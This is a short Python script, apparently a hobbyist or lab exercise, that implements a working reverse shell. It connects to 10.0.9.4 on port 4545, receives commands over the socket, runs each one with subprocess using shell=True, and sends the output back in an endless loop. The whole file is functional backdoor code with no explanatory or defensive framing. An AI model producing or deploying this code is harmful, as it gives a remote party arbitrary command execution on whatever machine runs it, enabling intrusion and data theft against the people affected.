
import socket
import subprocess

def execute_command(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("10.0.9.4",4545))
connection.send("\n[+] Established connection by reverse socket \n")
while True:
    command = connection.recv(1024)
    print("\n[+] command to execute = "+str(command))
    command_result = execute_command(command)
    connection.send("prom>>"+command_result)

connection.close()